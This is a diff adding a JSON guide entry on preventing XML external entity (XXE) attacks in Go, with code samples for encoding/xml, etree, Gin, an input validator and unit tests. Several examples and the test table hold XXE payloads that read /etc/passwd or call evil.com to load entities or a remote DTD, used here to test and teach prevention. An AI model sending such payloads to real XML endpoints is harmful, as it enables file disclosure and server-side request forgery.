@@ -1,0 +1,124 @@
+{
+  "id": "go-prevention",
+  "category": "prevention",
+  "title": "Go XXE Prevention",
+  "description": "Complete guide to preventing XXE vulnerabilities in Go applications using encoding/xml and other XML libraries.",
+  "severity": "info",
+  "cvssScore": 0,
+  "cvssVector": "",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Go's standard library `encoding/xml` package is **safe from XXE by default**. It does not support external entities or DTD processing, making it inherently secure against XXE attacks.\n\n**Go XML Libraries:**\n• **encoding/xml** (standard library) - Safe by default, no external entity support\n• **libxml2 bindings** (third-party) - May be vulnerable if not configured properly\n• **etree** (third-party) - Safe, no external entity support\n• **xmlquery** (third-party) - Built on encoding/xml, inherits safety\n\n**Security Status:**\n• **encoding/xml** - **SAFE** (no external entity support)\n• **Most third-party libraries** - **SAFE** (pure Go implementations)\n• **CGO bindings to libxml2/expat** - **CHECK CAREFULLY**\n\n**Best Practice:**\nUse Go's standard `encoding/xml` package. If using CGO bindings to C libraries, verify external entity handling is disabled."
+    },
+    {
+      "id": "encoding-xml-safe",
+      "title": "encoding/xml (Safe by Default)",
+      "type": "text",
+      "content": "**Standard Library Safety:**\nGo's `encoding/xml` package does NOT support:\n• External entities (SYSTEM or PUBLIC)\n• DTD processing\n• Entity expansion beyond predefined entities (&lt; &gt; &amp; &quot; &apos;)\n\n**What This Means:**\n• XXE payloads will NOT work\n• External entity declarations are ignored\n• No file disclosure via XML\n• No SSRF via XML\n• No billion laughs attacks via entities\n\n**Predefined Entities Only:**\nThe standard library only expands the 5 predefined XML entities:\n```\n&lt;   →  <\n&gt;   →  >\n&amp;  →  &\n&quot; →  \"\n&apos; →  '\n```\n\nAny custom entities (internal or external) are ignored or cause parse errors."
+    },
+    {
+      "id": "encoding-xml-secure",
+      "title": "encoding/xml Secure Usage",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"encoding/xml\"\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n)\n\n// Define your XML structure\ntype Message struct {\n\tXMLName xml.Name `xml:\"root\"`\n\tData    string   `xml:\"data\"`\n\tValue   int      `xml:\"value\"`\n}\n\n// SECURE: Standard parsing with encoding/xml\nfunc parseXMLSecure(xmlData []byte) (*Message, error) {\n\tvar msg Message\n\t\n\t// This is safe - external entities ignored\n\terr := xml.Unmarshal(xmlData, &msg)\n\tif err != nil {\n\t\treturn nil, fmt.Errorf(\"invalid XML: %w\", err)\n\t}\n\t\n\treturn &msg, nil\n}\n\n// SECURE: HTTP handler with input validation\nfunc xmlHandler(w http.ResponseWriter, r *http.Request) {\n\t// Validate content type\n\tif r.Header.Get(\"Content-Type\") != \"application/xml\" {\n\t\thttp.Error(w, \"Invalid content type\", http.StatusUnsupportedMediaType)\n\t\treturn\n\t}\n\t\n\t// Limit request body size (1MB)\n\tmaxSize := int64(1048576)\n\tr.Body = http.MaxBytesReader(w, r.Body, maxSize)\n\t\n\t// Read body\n\txmlData, err := io.ReadAll(r.Body)\n\tif err != nil {\n\t\thttp.Error(w, \"Request too large\", http.StatusRequestEntityTooLarge)\n\t\treturn\n\t}\n\tdefer r.Body.Close()\n\t\n\t// Parse XML (safe from XXE)\n\tmsg, err := parseXMLSecure(xmlData)\n\tif err != nil {\n\t\thttp.Error(w, \"Invalid XML\", http.StatusBadRequest)\n\t\treturn\n\t}\n\t\n\t// Process message\n\tfmt.Fprintf(w, \"Processed: %s\\n\", msg.Data)\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/api/xml\", xmlHandler)\n\tfmt.Println(\"Server starting on :8080\")\n\thttp.ListenAndServe(\":8080\", nil)\n}",
+        "isVulnerable": false,
+        "filename": "main.go"
+      }
+    },
+    {
+      "id": "decoder-usage",
+      "title": "Using xml.Decoder for Streaming",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"encoding/xml\"\n\t\"fmt\"\n\t\"io\"\n\t\"strings\"\n)\n\n// SECURE: Streaming XML parsing with xml.Decoder\nfunc parseXMLStream(xmlReader io.Reader) error {\n\t// Create decoder from reader\n\tdecoder := xml.NewDecoder(xmlReader)\n\t\n\t// Decoder is safe - does not expand external entities\n\t// Even if XML contains <!DOCTYPE> with entities, they're ignored\n\t\n\tfor {\n\t\t// Read next token\n\t\ttoken, err := decoder.Token()\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t}\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"parse error: %w\", err)\n\t\t}\n\t\t\n\t\t// Process token based on type\n\t\tswitch elem := token.(type) {\n\t\tcase xml.StartElement:\n\t\t\tfmt.Printf(\"Start element: %s\\n\", elem.Name.Local)\n\t\t\t\n\t\tcase xml.EndElement:\n\t\t\tfmt.Printf(\"End element: %s\\n\", elem.Name.Local)\n\t\t\t\n\t\tcase xml.CharData:\n\t\t\tfmt.Printf(\"Character data: %s\\n\", string(elem))\n\t\t}\n\t}\n\t\n\treturn nil\n}\n\n// Example with XXE attempt (will be safely ignored)\nfunc exampleXXEAttempt() {\n\txxePayload := `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>`\n\t\n\treader := strings.NewReader(xxePayload)\n\t\n\t// This is SAFE - the &xxe; entity will NOT be expanded\n\t// encoding/xml ignores external entity declarations\n\terr := parseXMLStream(reader)\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t}\n\t\n\t// The &xxe; reference will either:\n\t// 1. Be left as literal \"&xxe;\"\n\t// 2. Cause a parse error (entity not defined)\n\t// It will NOT read /etc/passwd\n}",
+        "isVulnerable": false,
+        "filename": "decoder_example.go"
+      }
+    },
+    {
+      "id": "input-validation",
+      "title": "Input Validation and Sanitization",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/xml\"\n\t\"errors\"\n\t\"fmt\"\n\t\"regexp\"\n)\n\n// XMLValidator provides input validation for XML\ntype XMLValidator struct {\n\tMaxSize          int64\n\tAllowDOCTYPE     bool\n\tAllowedRootNames []string\n}\n\n// NewXMLValidator creates validator with secure defaults\nfunc NewXMLValidator() *XMLValidator {\n\treturn &XMLValidator{\n\t\tMaxSize:      1048576, // 1MB\n\t\tAllowDOCTYPE: false,   // Reject DOCTYPE by default\n\t}\n}\n\n// Validate checks XML before parsing\nfunc (v *XMLValidator) Validate(xmlData []byte) error {\n\t// Size check\n\tif int64(len(xmlData)) > v.MaxSize {\n\t\treturn fmt.Errorf(\"XML exceeds maximum size of %d bytes\", v.MaxSize)\n\t}\n\t\n\t// DOCTYPE check (defense in depth)\n\tif !v.AllowDOCTYPE {\n\t\tdoctypeRegex := regexp.MustCompile(`(?i)<!DOCTYPE`)\n\t\tif doctypeRegex.Match(xmlData) {\n\t\t\treturn errors.New(\"DOCTYPE declarations not allowed\")\n\t\t}\n\t}\n\t\n\t// ENTITY check (additional safety, though encoding/xml ignores them)\n\tentityRegex := regexp.MustCompile(`(?i)<!ENTITY`)\n\tif entityRegex.Match(xmlData) {\n\t\treturn errors.New(\"ENTITY declarations not allowed\")\n\t}\n\t\n\treturn nil\n}\n\n// ParseSafe validates and parses XML\nfunc (v *XMLValidator) ParseSafe(xmlData []byte, target interface{}) error {\n\t// Validate first\n\tif err := v.Validate(xmlData); err != nil {\n\t\treturn fmt.Errorf(\"validation failed: %w\", err)\n\t}\n\t\n\t// Parse (safe due to encoding/xml)\n\tif err := xml.Unmarshal(xmlData, target); err != nil {\n\t\treturn fmt.Errorf(\"parse failed: %w\", err)\n\t}\n\t\n\treturn nil\n}\n\n// Example usage\ntype Config struct {\n\tXMLName xml.Name `xml:\"config\"`\n\tName    string   `xml:\"name\"`\n\tValue   string   `xml:\"value\"`\n}\n\nfunc main() {\n\tvalidator := NewXMLValidator()\n\t\n\txmlData := []byte(`<?xml version=\"1.0\"?>\n<config>\n  <name>test</name>\n  <value>123</value>\n</config>`)\n\t\n\tvar config Config\n\tif err := validator.ParseSafe(xmlData, &config); err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t\treturn\n\t}\n\t\n\tfmt.Printf(\"Config: %+v\\n\", config)\n}",
+        "isVulnerable": false,
+        "filename": "validator.go"
+      }
+    },
+    {
+      "id": "third-party-libraries",
+      "title": "Third-Party XML Libraries",
+      "type": "text",
+      "content": "**Popular Go XML Libraries:**\n\n**1. encoding/xml (Standard Library)**\n• **Status:** SAFE\n• **Features:** Full XML 1.0 support, no external entities\n• **Use:** Default choice for XML parsing\n\n**2. github.com/beevik/etree**\n• **Status:** SAFE\n• **Features:** Element tree API, pure Go\n• **Use:** When you need DOM-like manipulation\n\n**3. github.com/antchfx/xmlquery**\n• **Status:** SAFE\n• **Features:** XPath queries, built on encoding/xml\n• **Use:** When you need XPath support\n\n**4. CGO Bindings (libxml2, expat)**\n• **Status:** POTENTIALLY VULNERABLE\n• **Warning:** May support external entities\n• **Recommendation:** Avoid unless necessary, configure carefully\n\n**When Using Third-Party Libraries:**\n• Verify they don't use CGO to call C libraries\n• Check documentation for entity handling\n• Review source code for external entity support\n• Test with XXE payloads"
+    },
+    {
+      "id": "etree-example",
+      "title": "beevik/etree Secure Usage",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n\t\n\t\"github.com/beevik/etree\"\n)\n\n// SECURE: etree library (pure Go, no external entities)\nfunc parseWithEtree(xmlData string) error {\n\t// Create document\n\tdoc := etree.NewDocument()\n\t\n\t// Parse XML (safe - etree doesn't support external entities)\n\tif err := doc.ReadFromString(xmlData); err != nil {\n\t\treturn fmt.Errorf(\"parse error: %w\", err)\n\t}\n\t\n\t// Navigate and extract data\n\troot := doc.SelectElement(\"root\")\n\tif root == nil {\n\t\treturn fmt.Errorf(\"root element not found\")\n\t}\n\t\n\t// Find elements using XPath-like syntax\n\tfor _, elem := range root.SelectElements(\"data\") {\n\t\tfmt.Printf(\"Data: %s\\n\", elem.Text())\n\t}\n\t\n\treturn nil\n}\n\n// Example with XXE attempt (safely ignored)\nfunc exampleEtreeXXE() {\n\txxePayload := `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>`\n\t\n\t// This is SAFE - etree will ignore the external entity\n\terr := parseWithEtree(xxePayload)\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t\treturn\n\t}\n\t\n\t// The &xxe; entity will NOT be expanded\n}\n\nfunc main() {\n\t// Safe XML example\n\tsafeXML := `<?xml version=\"1.0\"?>\n<root>\n  <data>Hello World</data>\n</root>`\n\t\n\tif err := parseWithEtree(safeXML); err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t}\n}",
+        "isVulnerable": false,
+        "filename": "etree_example.go"
+      }
+    },
+    {
+      "id": "gin-framework",
+      "title": "Gin Framework XML Handling",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"net/http\"\n\t\n\t\"github.com/gin-gonic/gin\"\n)\n\n// Request structure\ntype XMLRequest struct {\n\tName  string `xml:\"name\" binding:\"required\"`\n\tEmail string `xml:\"email\" binding:\"required,email\"`\n\tAge   int    `xml:\"age\" binding:\"required,min=1,max=120\"`\n}\n\n// Response structure\ntype XMLResponse struct {\n\tStatus  string `xml:\"status\"`\n\tMessage string `xml:\"message\"`\n}\n\nfunc main() {\n\trouter := gin.Default()\n\t\n\t// Middleware to limit request size\n\trouter.Use(func(c *gin.Context) {\n\t\tc.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 1048576) // 1MB\n\t\tc.Next()\n\t})\n\t\n\t// SECURE: Gin uses encoding/xml by default\n\trouter.POST(\"/api/xml\", func(c *gin.Context) {\n\t\tvar req XMLRequest\n\t\t\n\t\t// BindXML uses encoding/xml (safe from XXE)\n\t\tif err := c.BindXML(&req); err != nil {\n\t\t\tc.XML(http.StatusBadRequest, XMLResponse{\n\t\t\t\tStatus:  \"error\",\n\t\t\t\tMessage: \"Invalid XML\",\n\t\t\t})\n\t\t\treturn\n\t\t}\n\t\t\n\t\t// Process request\n\t\tc.XML(http.StatusOK, XMLResponse{\n\t\t\tStatus:  \"success\",\n\t\t\tMessage: \"Processed XML for \" + req.Name,\n\t\t})\n\t})\n\t\n\trouter.Run(\":8080\")\n}\n\n// Custom middleware for additional XML validation\nfunc XMLValidationMiddleware() gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\t// Check Content-Type\n\t\tif c.ContentType() != \"application/xml\" {\n\t\t\tc.AbortWithStatusJSON(http.StatusUnsupportedMediaType, gin.H{\n\t\t\t\t\"error\": \"Content-Type must be application/xml\",\n\t\t\t})\n\t\t\treturn\n\t\t}\n\t\t\n\t\tc.Next()\n\t}\n}",
+        "isVulnerable": false,
+        "filename": "gin_xml.go"
+      }
+    },
+    {
+      "id": "testing",
+      "title": "Testing XXE Prevention",
+      "type": "code",
+      "code": {
+        "language": "go",
+        "code": "package main\n\nimport (\n\t\"encoding/xml\"\n\t\"strings\"\n\t\"testing\"\n)\n\ntype TestMessage struct {\n\tXMLName xml.Name `xml:\"root\"`\n\tData    string   `xml:\"data\"`\n}\n\n// Test that XXE payloads are NOT expanded\nfunc TestXXEPrevention(t *testing.T) {\n\ttests := []struct {\n\t\tname    string\n\t\tpayload string\n\t}{\n\t\t{\n\t\t\tname: \"External entity file disclosure\",\n\t\t\tpayload: `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>`,\n\t\t},\n\t\t{\n\t\t\tname: \"External entity SSRF\",\n\t\t\tpayload: `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://evil.com/xxe\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>`,\n\t\t},\n\t\t{\n\t\t\tname: \"Parameter entity\",\n\t\t\tpayload: `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">\n  %xxe;\n]>\n<root>\n  <data>test</data>\n</root>`,\n\t\t},\n\t}\n\t\n\tfor _, tt := range tests {\n\t\tt.Run(tt.name, func(t *testing.T) {\n\t\t\tvar msg TestMessage\n\t\t\t\n\t\t\t// Attempt to parse XXE payload\n\t\t\terr := xml.Unmarshal([]byte(tt.payload), &msg)\n\t\t\t\n\t\t\t// Either parse succeeds with entity NOT expanded\n\t\t\t// OR parse fails (both are acceptable)\n\t\t\tif err == nil {\n\t\t\t\t// Verify no file contents or SSRF data in result\n\t\t\t\tif strings.Contains(msg.Data, \"root:\") ||\n\t\t\t\t\tstrings.Contains(msg.Data, \"http\") {\n\t\t\t\t\tt.Errorf(\"XXE payload was expanded! Got: %s\", msg.Data)\n\t\t\t\t}\n\t\t\t\tt.Logf(\"Parse succeeded, entity not expanded: %s\", msg.Data)\n\t\t\t} else {\n\t\t\t\tt.Logf(\"Parse failed (acceptable): %v\", err)\n\t\t\t}\n\t\t})\n\t}\n}\n\n// Test that valid XML is parsed correctly\nfunc TestValidXMLParsing(t *testing.T) {\n\tvalidXML := `<?xml version=\"1.0\"?>\n<root>\n  <data>Hello World</data>\n</root>`\n\t\n\tvar msg TestMessage\n\terr := xml.Unmarshal([]byte(validXML), &msg)\n\t\n\tif err != nil {\n\t\tt.Errorf(\"Valid XML failed to parse: %v\", err)\n\t}\n\t\n\tif msg.Data != \"Hello World\" {\n\t\tt.Errorf(\"Expected 'Hello World', got '%s'\", msg.Data)\n\t}\n}",
+        "isVulnerable": false,
+        "filename": "xxe_test.go"
+      }
+    },
+    {
+      "id": "best-practices",
+      "title": "Go XML Security Best Practices",
+      "type": "text",
+      "content": "**Best Practices for Go XML Security:**\n\n**1. Use Standard Library**\n☐ Prefer `encoding/xml` over third-party libraries\n☐ Inherently safe from XXE\n☐ Well-tested and maintained\n\n**2. Input Validation**\n☐ Validate Content-Type header\n☐ Enforce size limits (use http.MaxBytesReader)\n☐ Reject DOCTYPE declarations (defense in depth)\n☐ Validate against expected schema\n\n**3. Error Handling**\n☐ Don't expose parse errors to users\n☐ Log errors internally with details\n☐ Return generic error messages\n☐ Monitor for XXE attempt patterns\n\n**4. Third-Party Libraries**\n☐ Verify no CGO usage (pure Go preferred)\n☐ Review for external entity support\n☐ Test with XXE payloads\n☐ Keep dependencies updated\n\n**5. Testing**\n☐ Include XXE payloads in security tests\n☐ Verify entities not expanded\n☐ Test with various attack vectors\n☐ Automate security testing in CI/CD\n\n**6. Monitoring**\n☐ Log all XML parsing operations\n☐ Alert on suspicious patterns (DOCTYPE, ENTITY)\n☐ Monitor for parse errors\n☐ Track XML endpoint usage"
+    },
+    {
+      "id": "checklist",
+      "title": "Go XXE Prevention Checklist",
+      "type": "text",
+      "content": "☐ **Use encoding/xml from standard library**\n   • Avoid third-party XML libraries unless necessary\n   • Verify third-party libraries are pure Go\n\n☐ **Validate input before parsing**\n   • Check Content-Type header\n   • Enforce size limits (1MB default)\n   • Reject DOCTYPE if not needed\n   • Reject ENTITY declarations\n\n☐ **Use http.MaxBytesReader**\n   • Limit request body size\n   • Prevent DoS via large XML\n   • Apply to all XML endpoints\n\n☐ **Implement proper error handling**\n   • Don't expose parse errors\n   • Log errors with request context\n   • Return generic error messages\n\n☐ **Test XXE prevention**\n   • Include XXE tests in test suite\n   • Test all XML parsing code paths\n   • Verify entities not expanded\n   • Test with actual attack payloads\n\n☐ **Keep dependencies updated**\n   • Run `go get -u` regularly\n   • Monitor security advisories\n   • Use `go mod tidy` to clean up\n\n☐ **Review code for XML parsing**\n   • Audit all xml.Unmarshal calls\n   • Verify no unsafe third-party libs\n   • Check for CGO XML bindings\n\n☐ **Monitor and log**\n   • Log all XML parsing attempts\n   • Alert on suspicious patterns\n   • Track parsing errors"
+    }
+  ],
+  "relatedTopics": ["secure-patterns", "testing-methodology", "defense-in-depth"],
+  "references": [
+    {
+      "title": "Go encoding/xml Documentation",
+      "url": "https://pkg.go.dev/encoding/xml"
+    },
+    {
+      "title": "beevik/etree",
+      "url": "https://github.com/beevik/etree"
+    },
+    {
+      "title": "OWASP XXE Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    }
+  ]
+}
